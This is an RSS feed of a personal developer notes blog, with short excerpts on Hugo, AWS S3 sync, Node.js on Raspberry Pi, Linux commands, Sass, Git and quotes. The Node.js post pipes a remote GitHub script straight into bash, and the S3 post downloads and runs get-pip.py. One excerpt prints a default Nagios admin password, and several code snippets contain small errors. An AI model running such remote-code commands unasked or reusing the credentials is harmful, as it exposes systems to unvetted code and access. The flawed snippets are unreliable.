<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on TLDR Dev Notes</title>
    <link>/post/</link>
    <description>Recent content in Posts on TLDR Dev Notes</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>&amp;copy; 2016. All rights reserved.</copyright>
    <lastBuildDate>Sun, 28 Sep 2014 00:00:00 +0000</lastBuildDate>
    
	<atom:link href="/post/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>Creating a New Theme</title>
      <link>/post/creating-a-new-theme/</link>
      <pubDate>Sun, 28 Sep 2014 00:00:00 +0000</pubDate>
      
      <guid>/post/creating-a-new-theme/</guid>
      <description>Introduction This tutorial will show you how to create a simple theme in Hugo. I assume that you are familiar with HTML, the bash command line, and that you are comfortable using Markdown to format content. I&amp;rsquo;ll explain how Hugo uses templates and how you can organize your templates to create a theme. I won&amp;rsquo;t cover using CSS to style your theme.
We&amp;rsquo;ll start with creating a new site with a very basic template.</description>
    </item>
    
    <item>
      <title>Migrate to Hugo from Jekyll</title>
      <link>/post/migrate-from-jekyll/</link>
      <pubDate>Mon, 10 Mar 2014 00:00:00 +0000</pubDate>
      
      <guid>/post/migrate-from-jekyll/</guid>
      <description>Move static content to static Jekyll has a rule that any directory not starting with _ will be copied as-is to the _site output. Hugo keeps all static content under static. You should therefore move it all there. With Jekyll, something that looked like
▾ &amp;lt;root&amp;gt;/ ▾ images/ logo.png  should become
▾ &amp;lt;root&amp;gt;/ ▾ static/ ▾ images/ logo.png  Additionally, you&amp;rsquo;ll want any files that should reside at the root (such as CNAME) to be moved to static.</description>
    </item>
    
    <item>
      <title>How to sync an entire Amazon S3 bucket locally</title>
      <link>/post/aws/sync-entire-aws-s3-bucket-locally/</link>
      <pubDate>Thu, 23 Feb 2017 00:00:00 +0000</pubDate>
      
      <guid>/post/aws/sync-entire-aws-s3-bucket-locally/</guid>
      <description>tl;dr brew install awscli # MacOS # apt update &amp;amp;&amp;amp; apt install awscli -y # Ubuntu # pip install --upgrade --user awscli # Unix aws configure aws s3 ls aws s3 sync s3://my-bucket .  Ubuntu install this is on a fresh Ubuntu system.
try first:
apt install awscli -y  echo `python --version` `pip --version`  install pip
curl -O https://bootstrap.pypa.io/get-pip.py &amp;amp;&amp;amp; python get-pip.py pip --version  install AWS CLI</description>
    </item>
    
    <item>
      <title>React, React Router and Redux Courses</title>
      <link>/post/_rsc/2016-12-01-rsc-course-react-courses/</link>
      <pubDate>Thu, 01 Dec 2016 15:50:29 +0500</pubDate>
      
      <guid>/post/_rsc/2016-12-01-rsc-course-react-courses/</guid>
      <description> React  Youtube: Brad Westfall - Learn React with Webpack, Babel, ES6, React Router, and XHR (AJAX) Requests Egghead.io: Start Using React to Build Web Applications Tutsplus: Modern Web Apps With React and Redux SitePoint Premium: React The ES6 Way Treehouse: React Basics  React Router Redux </description>
    </item>
    
    <item>
      <title>iOS, Bluetooth Low Energy (BLE), CoreBluetooth and Swift - for noobs</title>
      <link>/post/_ios-swift/2016-08-28-intro-ios-bluetooth-low-energy-ble-corebluetooth-swift-noobs/</link>
      <pubDate>Sun, 28 Aug 2016 15:35:22 +0500</pubDate>
      
      <guid>/post/_ios-swift/2016-08-28-intro-ios-bluetooth-low-energy-ble-corebluetooth-swift-noobs/</guid>
      <description>This talk by Yoav Shwartz on the Realm.io site and this post by Ryan Jones on Medium are the best starting points I have come across.
The official documentation by Apple on CoreBluetooth is in Objective-C, which sucks because Objective-C looks like gibberish to me and i want to write Swift code. You can still read the docs though, they have listed best practices to work with BLE and CoreBluettoth.</description>
    </item>
    
    <item>
      <title>Install/Upgrade Node.js on Raspberry Pi (Raspbian Jessie)</title>
      <link>/post/_raspberrypi/2016-08-24-howto-install-latest-node-js-raspberry-pi-raspbian-jessie/</link>
      <pubDate>Wed, 24 Aug 2016 17:07:46 +0500</pubDate>
      
      <guid>/post/_raspberrypi/2016-08-24-howto-install-latest-node-js-raspberry-pi-raspbian-jessie/</guid>
      <description>tl;dr Run this one command in Terminal:
curl raw.githubusercontent.com/aamnah/bash-scripts/master/install_nodejs.sh | bash  This will automatically run a script i wrote that takes care of removing existing Node.js stuff, downloading and installing the latest version, and cleaning up afterwards. It also confirms the Node.js version once the installation is done.
The Node.js version that comes pre-installed with Raspbian Jessie is old. If you check the version using node -v, it&amp;rsquo;ll give you v0.</description>
    </item>
    
    <item>
      <title>Linux is 20 years old. The web is less than 7000 days old. Together they have changed human civilization more rapidly than any pair of invention in the history of the world.</title>
      <link>/post/_quotes/2014-08-27-quote-linux-20-years-old-web-less-7000-days-old-together-changed-human-civilization-rapidly-pair-invention-history-world/</link>
      <pubDate>Wed, 27 Aug 2014 16:18:35 +0500</pubDate>
      
      <guid>/post/_quotes/2014-08-27-quote-linux-20-years-old-web-less-7000-days-old-together-changed-human-civilization-rapidly-pair-invention-history-world/</guid>
      <description> Linux is 20 years old. The web is less than 7000 days old. Together they have changed human civilization more rapidly than any pair of invention in the history of the world.
Eben Moglen
 </description>
    </item>
    
    <item>
      <title>DRY - Don&#39;t Repeat Yourself</title>
      <link>/post/_rsc/2014-08-27-link-dry-dont-repeat-yourself/</link>
      <pubDate>Wed, 27 Aug 2014 05:40:39 +0500</pubDate>
      
      <guid>/post/_rsc/2014-08-27-link-dry-dont-repeat-yourself/</guid>
      <description> Don&amp;rsquo;t Repeat Yourself  </description>
    </item>
    
    <item>
      <title>Automated MySQL Backups to Amazon S3 with AutoMySQLBackups</title>
      <link>/post/_databases/2014-08-19-howto-automated-mysql-backups-amazon-s3-automysqlbackups/</link>
      <pubDate>Tue, 19 Aug 2014 12:59:41 +0500</pubDate>
      
      <guid>/post/_databases/2014-08-19-howto-automated-mysql-backups-amazon-s3-automysqlbackups/</guid>
      <description>This how-to will teach you how to take automated backups of all your MySQL databases and send them to Amazon S3.
Access (Logins) required  root login for the server (sudo is required to run automysqlbackup, root is req. to add to root user’s cron)
 admin login for the mysql server (to provide for backup config file)
 IAM access keys to use with s3cmd (to configure s3cmd)</description>
    </item>
    
    <item>
      <title>Linux Directory Structure</title>
      <link>/post/_linux/2014-07-17-intro-linux-directory-structure/</link>
      <pubDate>Thu, 17 Jul 2014 23:04:19 +0500</pubDate>
      
      <guid>/post/_linux/2014-07-17-intro-linux-directory-structure/</guid>
      <description>Home ~ ~ represents the home directory of the user. ~ is the same as /username. All user specific files are saved here and the user has permission to write files by default in the home folder. Files in a user&amp;rsquo;s home directory can not be listed or viewed by other users.
Root / / is the root directory. Do not confuse it with /root. While / represents the root directory of the system, /root is the home directory for the root user.</description>
    </item>
    
    <item>
      <title>Redirection in Linux</title>
      <link>/post/_linux/2014-07-17-howto-redirection-in-linux/</link>
      <pubDate>Thu, 17 Jul 2014 22:34:46 +0500</pubDate>
      
      <guid>/post/_linux/2014-07-17-howto-redirection-in-linux/</guid>
      <description>In Linux, everything is a file. Redirection comes in very handy because you can move data from a file to another file, from the resulting output of a command to a file. You can also redirect the output of one command and feed it as an input to another command.
Output &amp;gt; The &amp;gt; symbol is used for redirecting output of one command to a new file or another command.</description>
    </item>
    
    <item>
      <title>how to redirect a URL in JavaScript</title>
      <link>/post/_javascript/2014-07-07-howto-redirect-url-javascript/</link>
      <pubDate>Mon, 07 Jul 2014 09:02:44 +0500</pubDate>
      
      <guid>/post/_javascript/2014-07-07-howto-redirect-url-javascript/</guid>
      <description> Here&amp;rsquo;s how you redirect a URL in JavaScript. Just set the value of window.location.replace to the URL you want.
&amp;lt;script type=&amp;ldquo;text/javascript&amp;rdquo;&amp;gt; window.location.href = &amp;ldquo;http://www.url.com&amp;quot; &amp;lt;/script&amp;gt; When redirecting, window.location.replace is preferred over window.location.href.
// similar behavior as an HTTP redirect window.location.replace(&amp;ldquo;http://stackoverflow.com&amp;quot;);
// similar behavior as clicking on a link window.location.href = &amp;ldquo;http://stackoverflow.com&amp;quot;;
Links  StackOverflow: How do I redirect to another page in JavaScript/jQuery? how to do a time delay redirect in JavaScript  </description>
    </item>
    
    <item>
      <title>Tool - Linux Dash</title>
      <link>/post/_rsc/2014-06-24-rsc-tool-linux-dash/</link>
      <pubDate>Tue, 24 Jun 2014 10:57:16 +0500</pubDate>
      
      <guid>/post/_rsc/2014-06-24-rsc-tool-linux-dash/</guid>
      <description>A simple web dashboard to monitor your linux server.</description>
    </item>
    
    <item>
      <title>Markdown Tables Generator</title>
      <link>/post/_rsc/2014-06-21-rsc-tool-markdown-tables-generator/</link>
      <pubDate>Sat, 21 Jun 2014 06:28:26 +0500</pubDate>
      
      <guid>/post/_rsc/2014-06-21-rsc-tool-markdown-tables-generator/</guid>
      <description>Generate tables in Markdown format using the quite simple GFM Markdown table syntax.</description>
    </item>
    
    <item>
      <title>Stopping, Quitting, Suspending and Killing Processes in Linux</title>
      <link>/post/_linux/2014-06-21-howto-stop-quit-suspend-kill-processes-linux/</link>
      <pubDate>Sat, 21 Jun 2014 06:12:50 +0500</pubDate>
      
      <guid>/post/_linux/2014-06-21-howto-stop-quit-suspend-kill-processes-linux/</guid>
      <description>ctrl + c (Interrupt) ctrl + c aka Keyboard Interrupt will interrupt your program which most programs will exit. This is useful when you start a program that just has been running for a really long time and you want to close it because you don&amp;rsquo;t want it to take up all your shell and you don&amp;rsquo;t really need to run it or maybe you used a command with the wrong arguments</description>
    </item>
    
    <item>
      <title>Tool - Explain Shell</title>
      <link>/post/_rsc/2014-06-21-rsc-tool-explain-shell/</link>
      <pubDate>Sat, 21 Jun 2014 05:45:48 +0500</pubDate>
      
      <guid>/post/_rsc/2014-06-21-rsc-tool-explain-shell/</guid>
      <description>Use ExplainShell to understand Linux commands. It’s an easy way to see what a unix command does from a web interface. The coolest and most useful tool for understanding commands and their usage.</description>
    </item>
    
    <item>
      <title>Tool - Display live Linux system stats (memory, CPU, IO)</title>
      <link>/post/_rsc/2014-06-20-rsc-tool-display-live-linux-system-stats-memory-cpu-io/</link>
      <pubDate>Fri, 20 Jun 2014 16:38:05 +0500</pubDate>
      
      <guid>/post/_rsc/2014-06-20-rsc-tool-display-live-linux-system-stats-memory-cpu-io/</guid>
      <description>This is a tiny application that streams these stats over a WebSocket using websocketd and charts them using SmoothieCharts.</description>
    </item>
    
    <item>
      <title>Tool - Bash Prompt ($PS1) Generator</title>
      <link>/post/_rsc/2014-06-20-rsc-tool-bash-prompt-ps1-generator/</link>
      <pubDate>Fri, 20 Jun 2014 13:15:38 +0500</pubDate>
      
      <guid>/post/_rsc/2014-06-20-rsc-tool-bash-prompt-ps1-generator/</guid>
      <description>This tool will help you generate a custom colorful bash prompt for Unix-like operating systems, including Linux and MacOS. Generate your .bashrc file easily with a drag and drop interface and color options.</description>
    </item>
    
    <item>
      <title>Book - Beyond Linux From Scratch (BLFS)</title>
      <link>/post/_rsc/2014-06-20-rsc-book-beyond-linux-scratch-blfs/</link>
      <pubDate>Fri, 20 Jun 2014 13:08:27 +0500</pubDate>
      
      <guid>/post/_rsc/2014-06-20-rsc-book-beyond-linux-scratch-blfs/</guid>
      <description>Read Online  This book follows on from the Linux From Scratch book. It introduces and guides the reader through additions to the system including networking, graphical interfaces, sound support, and printer and scanner support.</description>
    </item>
    
    <item>
      <title>Book - Linux From Scratch (LFS)</title>
      <link>/post/_rsc/2014-06-20-rsc-book-linux-from-scratch/</link>
      <pubDate>Fri, 20 Jun 2014 13:06:09 +0500</pubDate>
      
      <guid>/post/_rsc/2014-06-20-rsc-book-linux-from-scratch/</guid>
      <description>Read Online Download PDF  Linux From Scratch (LFS) is a project that provides you with step-by-step instructions for building your own customized Linux system entirely from source.</description>
    </item>
    
    <item>
      <title>Course - Practical Unix - Stanford</title>
      <link>/post/_rsc/2014-06-18-rsc-course-practical-unix-stanford/</link>
      <pubDate>Wed, 18 Jun 2014 15:07:34 +0500</pubDate>
      
      <guid>/post/_rsc/2014-06-18-rsc-course-practical-unix-stanford/</guid>
      <description>Excellent video tutorials course from Stanford University - Practical Unix. A practical introduction to using the Unix operating system with a focus on Linux command line skills. Topics include: grep and regular expressions, ZSH, Vim and Emacs, basic and advanced GDB features, permissions, working with the file system, revision control, Unix utilities, environment customization, and using Python for shell scripts. Topics may be added, given sufficient interest.</description>
    </item>
    
    <item>
      <title>Book - Start Programming Now - No CS degree required</title>
      <link>/post/_rsc/2014-06-17-rsc-book-start-programming-now/</link>
      <pubDate>Tue, 17 Jun 2014 06:56:13 +0500</pubDate>
      
      <guid>/post/_rsc/2014-06-17-rsc-book-start-programming-now/</guid>
      <description></description>
    </item>
    
    <item>
      <title>Book - Conquering the Command Line - Unix and Linux Commands for Developers</title>
      <link>/post/_rsc/2014-06-17-rsc-book-conquering-command-line/</link>
      <pubDate>Tue, 17 Jun 2014 05:49:35 +0500</pubDate>
      
      <guid>/post/_rsc/2014-06-17-rsc-book-conquering-command-line/</guid>
      <description></description>
    </item>
    
    <item>
      <title>The Zen of Python</title>
      <link>/post/_python/2014-06-15-the-zen-of-python/</link>
      <pubDate>Sun, 15 Jun 2014 04:25:40 +0500</pubDate>
      
      <guid>/post/_python/2014-06-15-the-zen-of-python/</guid>
      <description>Long time Pythoneer Tim Peters wrote this &amp;lsquo;Zen of Python&amp;rsquo;. It is considered like a summary manual of python&amp;rsquo;s philosophy.
 Beautiful is better than ugly.
Explicit is better than implicit.
Simple is better than complex.
Complex is better than complicated.
Flat is better than nested.
Sparse is better than dense.
Readability counts.
Special cases aren&amp;rsquo;t special enough to break the rules.
Although practicality beats purity.
Errors should never pass silently.</description>
    </item>
    
    <item>
      <title>Making a MySQL database connection with PHP</title>
      <link>/post/_databases/2014-06-07-howto-making-mysql-database-connection-php/</link>
      <pubDate>Sat, 07 Jun 2014 04:54:08 +0500</pubDate>
      
      <guid>/post/_databases/2014-06-07-howto-making-mysql-database-connection-php/</guid>
      <description>&amp;lt;?php mysql_connect(&amp;quot;db_host&amp;quot;,&amp;quot;db_user&amp;quot;,&amp;quot;db_pass&amp;quot;); mysql_select_db(&amp;quot;db_name&amp;quot;); ?&amp;gt;  Where db_host, db_user, db_pass and db_name is the host, username, password and name for your database respectively.
General practice is to save the code in a separate file in the &amp;lsquo;includes&amp;rsquo; folder and including it on the page where you need it.
&amp;lt;?php include(&amp;quot;database.php&amp;quot;) ?&amp;gt;  </description>
    </item>
    
    <item>
      <title>How to check if a user is root</title>
      <link>/post/bash-scripting/2014-06-05-howto-bash-scripting-check-user-root/</link>
      <pubDate>Thu, 05 Jun 2014 04:02:25 +0500</pubDate>
      
      <guid>/post/bash-scripting/2014-06-05-howto-bash-scripting-check-user-root/</guid>
      <description>The following script will use the whoami command to see what user you are. If you are root, it&amp;rsquo;ll continue running the script. If not, it&amp;rsquo;ll exist the script telling you that you are not root and need to use sudo.
#!/bin/bash owner=$(who am i | awk &#39;{print $1}&#39;) if [ &amp;quot;$(whoami)&amp;quot; != &#39;root&#39; ]; then echo &amp;quot;You don&#39;t have permission to run $0 as non-root user. Use sudo&amp;quot; exit 1; fi  </description>
    </item>
    
    <item>
      <title>Bash script to install a LAMP stack</title>
      <link>/post/bash-scripting/2014-06-05-script-bash-install-a-lamp-stack/</link>
      <pubDate>Thu, 05 Jun 2014 03:31:41 +0500</pubDate>
      
      <guid>/post/bash-scripting/2014-06-05-script-bash-install-a-lamp-stack/</guid>
      <description>The following script installs Apache, MySQL and PHP as well as PHPMyAdmin and some tweaks. For Debian based systems including Ubuntu. To install, copy the script to the server and run in the same folder you copied the file to by running the command:
bash lamp.sh  Here is the script code:
 View the Gist on Github</description>
    </item>
    
    <item>
      <title>Get Current Year in JavaScript</title>
      <link>/post/_javascript/date-howto-get-current-year-in-javascript/</link>
      <pubDate>Tue, 03 Jun 2014 13:48:57 +0500</pubDate>
      
      <guid>/post/_javascript/date-howto-get-current-year-in-javascript/</guid>
      <description>Local Time (machine) var d = new Date(); var yr = d.getYear //Returns the two digit year e.g. 14 var year = d.getFullYear //Returns the four digit year e.g. 2014  Universal Time (UTC) var d = new Date(); var yrUTC = d.getUTCYear //Returns the two digit year var yearUTC = d.getUTCFullYear //Returns the full year  Note: Knowing the difference between local machine time and time according to UTC matters.</description>
    </item>
    
    <item>
      <title>Converting 24 hour time to 12 hour time using Javascript</title>
      <link>/post/_javascript/date-howto-convert-24-hour-time-to-12-hour-time-using-javascript/</link>
      <pubDate>Tue, 03 Jun 2014 13:21:52 +0500</pubDate>
      
      <guid>/post/_javascript/date-howto-convert-24-hour-time-to-12-hour-time-using-javascript/</guid>
      <description> // convert hours to 12-hour format hours = ((hours + 11) % 12 + 1);  Links  StackOverflow: Convert date to another timezone in JavaScript  </description>
    </item>
    
    <item>
      <title>We can not solve our problems at the same level of thinking that created them.</title>
      <link>/post/_quotes/2014-05-27-quote-we-can-not-solve-our-problems-at-the-same-level-of-thinking-that-created-them/</link>
      <pubDate>Tue, 27 May 2014 18:45:18 +0500</pubDate>
      
      <guid>/post/_quotes/2014-05-27-quote-we-can-not-solve-our-problems-at-the-same-level-of-thinking-that-created-them/</guid>
      <description> We can not solve our problems at the same level of thinking that created them
Einstein
 </description>
    </item>
    
    <item>
      <title>Steganogrophy</title>
      <link>/post/_misc/2014-05-27-intro-steganogrophy/</link>
      <pubDate>Tue, 27 May 2014 16:41:56 +0500</pubDate>
      
      <guid>/post/_misc/2014-05-27-intro-steganogrophy/</guid>
      <description>Steganography is hiding data inside of other data. Hiding information inside of something else. For example, having text hidden inside of an image. It could also be an image inside of another image. It&amp;rsquo;s really just hididng one piece of data inside another piece of data.
It&amp;rsquo;s a quick way of sending messages to people without actually having the message seen. You&amp;rsquo;d have an arrangement with a friend where you&amp;rsquo;d send them an image, it&amp;rsquo;d have a messae hidden in it and they&amp;rsquo;d know to open the image in their steganography program, and it&amp;rsquo;d display the text for them.</description>
    </item>
    
    <item>
      <title>You wasted $150,000 on an education you coulda got for a buck fifty in late charges at the public library.</title>
      <link>/post/_quotes/2014-05-22-quote-college-education/</link>
      <pubDate>Thu, 22 May 2014 12:35:19 +0500</pubDate>
      
      <guid>/post/_quotes/2014-05-22-quote-college-education/</guid>
      <description> You wasted $150,000 on an education you coulda got for a buck fifty in late charges at the public library
Will Hunting
 </description>
    </item>
    
    <item>
      <title>If you&#39;re gonna learn three languages, learn English, learn Spanish and learn some coding framework. And I think you&#39;ll have a job for life if you do that.</title>
      <link>/post/_quotes/2014-05-22-quote-learn-three-languages/</link>
      <pubDate>Thu, 22 May 2014 10:21:48 +0500</pubDate>
      
      <guid>/post/_quotes/2014-05-22-quote-learn-three-languages/</guid>
      <description></description>
    </item>
    
    <item>
      <title>Open Files in New Tab by Default in Sublime Text 3</title>
      <link>/post/_workflow/2014-05-22-howto-open-in-new-tab-instead-of-window-in-sublime-text-3/</link>
      <pubDate>Thu, 22 May 2014 07:42:23 +0500</pubDate>
      
      <guid>/post/_workflow/2014-05-22-howto-open-in-new-tab-instead-of-window-in-sublime-text-3/</guid>
      <description>Go to Preferences &amp;gt; Settings - User (or Cmd + , is the shortcut for application Preferences in Mac.) Add the below snippet between the curly braces.
// Open files in New Tab &amp;quot;open_files_in_new_window&amp;quot;: false,  </description>
    </item>
    
    <item>
      <title>Debugging Sass</title>
      <link>/post/_css-sass/sass-debugging/</link>
      <pubDate>Thu, 22 May 2014 06:08:52 +0500</pubDate>
      
      <guid>/post/_css-sass/sass-debugging/</guid>
      <description>sass --help OR sass -h OR sass -? will give you a whole list of commands you can use and how to use them.
sass --style compressed main.css will output a compressed version of main.css in the console.
sass --style compressed main.css:main.css the file before the : is the input file and the one after is the output file.
sass --style expanded main.css:main.css converts to &amp;lsquo;expanded&amp;rsquo; style, which is nested but without the indentation.</description>
    </item>
    
    <item>
      <title>Sass: Working with Libraries</title>
      <link>/post/_css-sass/sass-work-with-libraries/</link>
      <pubDate>Wed, 21 May 2014 20:13:51 +0500</pubDate>
      
      <guid>/post/_css-sass/sass-work-with-libraries/</guid>
      <description>By far the most popular Sass based UI framework is Bootstrap. Another one is Foundation.
Sass libraries are more like a collection of mixins, funtcions and classes. The most common is Compass. Then there is Bourbon.
Installing Bourbon sudo gem install bourbon  Including Bourbon in a Project just include the bourbon .scss file in the main stylesheet.
@import &amp;quot;bourbon_bourbon.scss&amp;quot;;  Benefits  You can use all the new CSS3 features without having to worry about backwards compatibility as Bourbon and Compass take care of adding vendor prefixes.</description>
    </item>
    
    <item>
      <title>Import Files in Sass with `@import`</title>
      <link>/post/_css-sass/sass-import-files/</link>
      <pubDate>Wed, 21 May 2014 19:51:45 +0500</pubDate>
      
      <guid>/post/_css-sass/sass-import-files/</guid>
      <description>Importing files is handy when you have your css in multiple files instead of one bloated stylesheet. See Bootstrap&amp;rsquo;s Sass files for an example. Every css component gets it&amp;rsquo;s own .scss file and they all get compiled into one main stylesheet.
The usual imports in a main.scss file are something like this:
// Reset @import &amp;quot;_reset.scss&amp;quot;; // Definings @import &amp;quot;_varables.scss&amp;quot;; @import &amp;quot;_mixins.scss&amp;quot;; // Global Styles @imprt &amp;quot;_globals.scss&amp;quot;; // Page specifics @import &amp;quot;pages/_about_us.</description>
    </item>
    
    <item>
      <title>Create a Color Palette in Sass</title>
      <link>/post/_css-sass/sass-color-palette/</link>
      <pubDate>Wed, 21 May 2014 19:26:53 +0500</pubDate>
      
      <guid>/post/_css-sass/sass-color-palette/</guid>
      <description>$background: #f3f3f3; $text_color: #888; $link_color: #; $primary_color: mix(#ff0000, #fefefe); $secondary_color: complement($primary_color); $highlighted_text_color: darken($text_color, 30%);  Light and Dark shades Get a darker shade color: darken($text_color, 20%);  OR
color: darken(#888, 20%)  will give you a 20% darker shade of $text_color or #888. If you use a variable, it&amp;rsquo;ll change the colors dynamically, meaning the light/dark shade will vary with the base color variable used.
Get a lighter shade color: lighten($text_color, 20%);  OR</description>
    </item>
    
    <item>
      <title>Basic Unix/Linux System Monitoring Commands</title>
      <link>/post/_linux/2014-05-21-unix-linux-commands-for-system-monitoring/</link>
      <pubDate>Wed, 21 May 2014 16:36:02 +0500</pubDate>
      
      <guid>/post/_linux/2014-05-21-unix-linux-commands-for-system-monitoring/</guid>
      <description>  Disk: df -h RAM: free -m CPU: ps -ef / top Load Averages: uptime  Memory Usage  top Show top processes free Display amount of free and used memory in the system. cat /proc/meminfo Show memory size and usage. vmstat Monitor virtual memory  </description>
    </item>
    
    <item>
      <title>How to change the default editor in Terminal</title>
      <link>/post/_linux/2014-05-21-howto-terminal-change-default-editor/</link>
      <pubDate>Wed, 21 May 2014 16:34:20 +0500</pubDate>
      
      <guid>/post/_linux/2014-05-21-howto-terminal-change-default-editor/</guid>
      <description>In the terminal, run
export EDITOR=nano  to change the default editor to nano (or whatever) and then run
source ~/.bashrc  for the change to take effect</description>
    </item>
    
    <item>
      <title>Crontab Basics</title>
      <link>/post/_linux/2014-05-21-basics-crontab/</link>
      <pubDate>Wed, 21 May 2014 16:32:55 +0500</pubDate>
      
      <guid>/post/_linux/2014-05-21-basics-crontab/</guid>
      <description>tl;dr crontab -l # List crontab entries crontab -e # Edit a crontab using the EDITOR specified (export EDITOR=nano) crontab -r # Remove a crontab sudo crontab -e # Edit root user’s crontab crontab my-crontab # add cron jobs by giving a file to crontab   If you are adding a script in any of the cron directories, it has to be executable Use absolute paths for files, directories and executable commands it should link to the absolute path of the executables (commands).</description>
    </item>
    
    <item>
      <title>Nagios</title>
      <link>/post/_linux/2014-05-21-basics-nagios/</link>
      <pubDate>Wed, 21 May 2014 16:31:32 +0500</pubDate>
      
      <guid>/post/_linux/2014-05-21-basics-nagios/</guid>
      <description>  Install: apt update &amp;amp;&amp;amp; apt install -y nagios3 Check install: dpkg -l | grep -i nagios Default login: nagiosadmin, g_!_o
 Listing packages of nagios: dpkg -L nagios3  NOTES  aptitude is a front-end for dpkg. dpkg is the package manager.  </description>
    </item>
    
    <item>
      <title>System Monitor for Raspberry Pi</title>
      <link>/post/_raspberrypi/2014-05-21-howto-raspi-system-monitor/</link>
      <pubDate>Wed, 21 May 2014 16:30:36 +0500</pubDate>
      
      <guid>/post/_raspberrypi/2014-05-21-howto-raspi-system-monitor/</guid>
      <description>RPi-Monitor is a nifty utility that monitors and displays system information about your Raspberry Pi in a nice-looking graphical interface in the browser.
It can show you how much CPU Load you have, what is the temperature of your Raspberry Pi (good to know in cases where you have overclocked the raspberry pi), Used, Free and Total Memroy (RAM), Used, Free and Total Space you have on both partitions of your SD Card, Used, Free and Total SWAP space (Virtual RAM), how long the Raspberry Pi has been running (Uptime), and general information about your Versions (Kernel, Firmware, Processor etc.</description>
    </item>
    
    <item>
      <title>Vim Basics</title>
      <link>/post/_linux/2014-05-21-basics-vim/</link>
      <pubDate>Wed, 21 May 2014 16:27:11 +0500</pubDate>
      
      <guid>/post/_linux/2014-05-21-basics-vim/</guid>
      <description>Save file and exit in Vim  To go to insert mode: i
 To save: [Esc] and zz
 To quit: [Esc] and :wq
  Common Vi / Vim File Savings Related Commands (ex mode) You need to press [Esc] key followed by the colon : before typing the following commands:
 q Quit
 q! Quit without saving changes i.e. discard changes
 r fileName Read data from file called fileName</description>
    </item>
    
    <item>
      <title>Custom Raspberry Pi MOTD (Message Of The Day)</title>
      <link>/post/_raspberrypi/2014-05-21-howto-raspi-motd-message-of-the-day/</link>
      <pubDate>Wed, 21 May 2014 16:25:33 +0500</pubDate>
      
      <guid>/post/_raspberrypi/2014-05-21-howto-raspi-motd-message-of-the-day/</guid>
      <description>let upSeconds=&amp;quot;$(/usr/bin/cut -d. -f1 /proc/uptime)&amp;quot; let secs=$((${upSeconds}%60)) let mins=$((${upSeconds}/60%60)) let hours=$((${upSeconds}/3600%24)) let days=$((${upSeconds}/86400)) UPTIME=`printf &amp;quot;%d days, %02dh%02dm%02ds&amp;quot; &amp;quot;$days&amp;quot; &amp;quot;$hours&amp;quot; &amp;quot;$mins&amp;quot; &amp;quot;$secs&amp;quot;` # get the load averages read one five fifteen rest &amp;lt; /proc/loadavg echo &amp;quot;$(tput setaf 2) .~~. .~~. `date +&amp;quot;%A, %e %B %Y, %r&amp;quot;` &#39;. \ &#39; &#39; / .&#39; `uname -srmo`$(tput setaf 1) .~ .~~~..~. : .~.&#39;~&#39;.~. : Uptime.............: ${UPTIME} ~ ( ) ( ) ~ Memory.............: `cat /proc/meminfo | grep MemFree | awk {&#39;print $2&#39;}`kB (Free) / `cat /proc/meminfo | grep MemTotal | awk {&#39;print $2&#39;}`kB (Total) ( : &#39;~&#39;.</description>
    </item>
    
    <item>
      <title>MongoDB Basics</title>
      <link>/post/_databases/2014-05-21-basics-mongodb/</link>
      <pubDate>Wed, 21 May 2014 16:24:07 +0500</pubDate>
      
      <guid>/post/_databases/2014-05-21-basics-mongodb/</guid>
      <description>Basic Commands  show dbs Show databases
 use dbName Connect/Select database
 use dbName Create database (MongoDB doesn&amp;rsquo;t actually create a db until we start storing documents, so although you now have the db bookmarks, it&amp;rsquo;s not actually saved anywhere until we put some data in it. Same goes for collectons )
 db show the db you are using
 doc show the document content  NoSQL Database Terms    MongoDB MySQL     Collections Tables   Documents Rows   Fields (key:value pairs) Columns    Adding Data There are two methods.</description>
    </item>
    
    <item>
      <title>JavaScript Basics</title>
      <link>/post/_javascript/2014-05-21-basics-javascript/</link>
      <pubDate>Wed, 21 May 2014 16:22:38 +0500</pubDate>
      
      <guid>/post/_javascript/2014-05-21-basics-javascript/</guid>
      <description>Comparison Operators &amp;gt; Greater than
&amp;lt; Less than
&amp;gt;= Greater than equal to
&amp;lt;= Less than equal to
=== Equal to
!== Not equal to
logical operators JavaScript has three: and &amp;amp;&amp;amp;, or ||, and not !.
Modulo
Modulo is the same as remainder. When % is placed between two numbers, the computer will divide the first number by the second, and then return the remainder of that division.</description>
    </item>
    
    <item>
      <title>Git Basics</title>
      <link>/post/_git-github/git-basics/</link>
      <pubDate>Wed, 21 May 2014 16:17:32 +0500</pubDate>
      
      <guid>/post/_git-github/git-basics/</guid>
      <description>Configuration configure username
git config --global user.name &amp;quot;Your Name&amp;quot;  configure email
git config --global user.email &amp;quot;me@mydomain.com&amp;quot;  check confgiuration
git config --list  Repositories Start a git repo
git init my_new-repo  Start a git repo in existing folder, cd to that folder and..
git init  Removing the repo = just remove the .git folder, it&amp;rsquo;s the brains
rm -r my_project/.git  where my_project is the project folder you are removing git from.</description>
    </item>
    
    <item>
      <title>How to install Compass on a Mac via Command Line</title>
      <link>/post/_css-sass/sass-install-compass-mac-via-command-line/</link>
      <pubDate>Wed, 21 May 2014 15:34:28 +0500</pubDate>
      
      <guid>/post/_css-sass/sass-install-compass-mac-via-command-line/</guid>
      <description>Compass is a Ruby gem, so in order to install it you must have Ruby installed. Macs come pre-installed with Ruby.
sudo gem update --system sudo gem install compass compass --version  Notes  sudo gem update --system will make sure all gems are up to date You can use sass --version to see if you have installed or what version of Sass is it sudo gem install compass will also install Sass if it isn&amp;rsquo;t already installed compass --version will confirm the installation by telling you what version of Compass you have installed If command line scares you, you can install GUI apps for Compass, like:</description>
    </item>
    
    <item>
      <title>Restart services in Linux</title>
      <link>/post/_linux/2014-05-21-howto-linux-restart-services/</link>
      <pubDate>Wed, 21 May 2014 15:33:52 +0500</pubDate>
      
      <guid>/post/_linux/2014-05-21-howto-linux-restart-services/</guid>
      <description> Restart SSH  sudo service sshd restart  or
sudo service ssh restart   Restart Apache  sudo service apache2 restart  </description>
    </item>
    
    <item>
      <title>Unix: Using pushd and popd for faster navigation</title>
      <link>/post/_linux/2014-05-21-unix-using-pushd-and-popd-for-faster-navigation/</link>
      <pubDate>Wed, 21 May 2014 15:33:21 +0500</pubDate>
      
      <guid>/post/_linux/2014-05-21-unix-using-pushd-and-popd-for-faster-navigation/</guid>
      <description>Unix: Using pushd and popd for faster navigation
